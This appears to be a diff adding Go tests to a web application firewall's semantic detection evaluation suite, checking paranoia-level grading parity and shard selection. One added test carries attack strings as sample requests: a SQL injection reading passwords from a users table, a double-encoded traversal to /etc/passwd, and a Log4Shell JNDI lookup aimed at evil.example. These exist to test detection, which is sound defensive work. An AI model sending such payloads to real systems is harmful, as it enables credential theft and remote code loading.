@@ -1,6 +1,7 @@
 package semantic
 
 import (
+	"bytes"
 	"compress/gzip"
 	"context"
 	"encoding/json"
@@ -82,9 +83,9 @@ func TestEvaluationPlatform(t *testing.T) {
 	// Compute aggregate metrics
 	computeAggregateMetrics(report)
 
-	// Compute by-paranoia-level metrics. This re-scans every source once per
-	// level (5x work, ~24 min on the full corpus) so it is skipped in -short
-	// mode to stay inside the CI timeout.
+	// Compute by-paranoia-level metrics. The sweep adds one log-mode pass over
+	// every source and re-grades its hits at levels 0-5. It is skipped in -short
+	// mode because the external corpus pass is still substantial.
 	if testing.Short() {
 		t.Log("Skipping by-paranoia-level sweep in -short mode")
 	} else {
@@ -171,6 +172,27 @@ type FailedCase struct {
 	Expected string `json:"expected"`
 	Got      string `json:"got,omitempty"`
 	Payload  string `json:"payload,omitempty"`
+}
+
+func TestEvaluationDocumentationMatchesModesAndLevels(t *testing.T) {
+	doc, err := os.ReadFile("../../../docs/evaluation-platform.md")
+	if err != nil {
+		t.Fatal(err)
+	}
+	for _, required := range []string{
+		"`-short`",
+		"`curated_corpus`",
+		"`external_dataset`",
+		"levels 0 through 5",
+		"`FPR_GATE`",
+		"`TPR_GATE`",
+		"`SEMANTIC_EVAL_SHARDS`",
+		"`merge-semantic-eval-shards.py`",
+	} {
+		if !bytes.Contains(doc, []byte(required)) {
+			t.Errorf("evaluation documentation is missing %q", required)
+		}
+	}
 }
 
 func processDataSource(t *testing.T, analyzer *Analyzer, sourceName, path string, required bool, report *EvaluationReport) {
@@ -907,7 +929,135 @@ func hitsBlockableAny(hits []Hit, level int) bool {
 	return false
 }
 
-// detectSampleQuiet runs detection without recording failures (for paranoia-level sweep)
+func TestParanoiaOfflineGradingMatchesOnlineAcrossSampleShapes(t *testing.T) {
+	t.Setenv("CHEESEWAF_SEMANTIC_DEBUG_METADATA", "1")
+
+	const multipartBoundary = "semantic-parity-boundary"
+	multipartBody := "--" + multipartBoundary + "\r\n" +
+		"Content-Disposition: form-data; name=\"query\"\r\n\r\n" +
+		"1 UNION SELECT password FROM users--\r\n" +
+		"--" + multipartBoundary + "--\r\n"
+	tests := []struct {
+		name     string
+		caseData securitytest.Case
+	}{
+		{
+			name: "uri",
+			caseData: securitytest.Case{Name: "uri", Method: http.MethodGet,
+				Target: "/download/%252e%252e/%252e%252e/etc/passwd"},
+		},
+		{
+			name: "query isolated",
+			caseData: securitytest.Case{Name: "query-isolated", Method: http.MethodGet,
+				Target: "/search?q=1%20UNION%20SELECT%20password%20FROM%20users--"},
+		},
+		{
+			name: "query embedded",
+			caseData: securitytest.Case{Name: "query-embedded", Method: http.MethodGet,
+				Target: "/notes?text=Observed%20%24%7Bjndi%3Aldap%3A%2F%2Fevil.example%2Fa%7D%20in%20logs"},
+		},
+		{
+			name: "header",
+			caseData: securitytest.Case{Name: "header", Method: http.MethodGet, Target: "/",
+				Header: map[string]string{"X-Query": "1 UNION SELECT password FROM users--"}},
+		},
+		{
+			name: "cookie",
+			caseData: securitytest.Case{Name: "cookie", Method: http.MethodGet, Target: "/",
+				Header: map[string]string{"Cookie": "query=1%20UNION%20SELECT%20password%20FROM%20users--"}},
+		},
+		{
+			name: "form body",
+			caseData: securitytest.Case{Name: "form", Method: http.MethodPost, Target: "/search",
+				ContentType: "application/x-www-form-urlencoded", Body: "query=1+UNION+SELECT+password+FROM+users--"},
+		},
+		{
+			name: "json body",
+			caseData: securitytest.Case{Name: "json", Method: http.MethodPost, Target: "/search",
+				ContentType: "application/json", Body: `{"query":"1 UNION SELECT password FROM users--"}`},
+		},
+		{
+			name: "raw body",
+			caseData: securitytest.Case{Name: "raw", Method: http.MethodPost, Target: "/search",
+				ContentType: "text/plain", Body: "1 UNION SELECT password FROM users--"},
+		},
+		{
+			name: "multipart body",
+			caseData: securitytest.Case{Name: "multipart", Method: http.MethodPost, Target: "/search",
+				ContentType: "multipart/form-data; boundary=" + multipartBoundary, Body: multipartBody},
+		},
+	}
+
+	for _, tc := range tests {
+		t.Run(tc.name, func(t *testing.T) {
+			ResetProcessCacheForTest()
+			hits := detectHitsOnce(t, &tc.caseData)
+			if len(hits) == 0 {
+				t.Fatal("sample did not produce any semantic hits")
+			}
+			for level := 0; level <= 5; level++ {
+				offline := hitsBlockableAny(hits, level)
+				online := detectSampleQuiet(NewAnalyzer("block", level), &tc.caseData)
+				if offline != online {
+					t.Fatalf("level %d parity mismatch: offline=%v online=%v hits=%+v", level, offline, online, hits)
+				}
+			}
+		})
+	}
+}
+
+func TestParanoiaSweepUsesPrimaryEvaluationShardMembership(t *testing.T) {
+	const shards = 2
+	var corpusLine []byte
+	for i := 0; i < 100; i++ {
+		tc := securitytest.Case{
+			Name:   fmt.Sprintf("shard-parity-%d", i),
+			Label:  "benign",
+			Method: http.MethodGet,
+			Target: "/health",
+		}
+		line, err := json.Marshal(tc)
+		if err != nil {
+			t.Fatal(err)
+		}
+		if securitytest.ShardIndexForRaw(line, shards) == 0 && securitytest.ShardIndexFor(tc.Name, shards) != 0 {
+			corpusLine = append(line, '\n')
+			break
+		}
+	}
+	if len(corpusLine) == 0 {
+		t.Fatal("failed to construct a deterministic raw-line/name shard mismatch")
+	}
+
+	corpusPath := filepath.Join(t.TempDir(), "paranoia-shard.jsonl")
+	if err := os.WriteFile(corpusPath, corpusLine, 0o600); err != nil {
+		t.Fatal(err)
+	}
+	t.Setenv("SEMANTIC_EVAL_SHARDS", strconv.Itoa(shards))
+	t.Setenv("SEMANTIC_EVAL_SHARD_INDEX", "0")
+	t.Setenv("CHEESEWAF_SEMANTIC_DEBUG_METADATA", "1")
+
+	dataSources := []struct {
+		name       string
+		benignPath string
+		attackPath string
+		required   bool
+		skipShort  bool
+	}{
+		{name: "shard_parity", benignPath: corpusPath, required: true},
+	}
+	report := &EvaluationReport{ByParanoiaLevel: make(map[string]*ParanoiaMetrics)}
+	computeByParanoiaLevel(t, dataSources, report)
+
+	for level := 0; level <= 5; level++ {
+		metrics := report.ByParanoiaLevel[strconv.Itoa(level)]
+		if metrics == nil || metrics.BenignTotal != 1 {
+			t.Fatalf("level %d benign total = %+v, want the one sample selected by the primary raw-line shard", level, metrics)
+		}
+	}
+}
+
+// detectSampleQuiet runs block-mode detection without recording failed cases.
 func detectSampleQuiet(analyzer *Analyzer, tc *securitytest.Case) bool {
 	method := tc.Method
 	if method == "" {
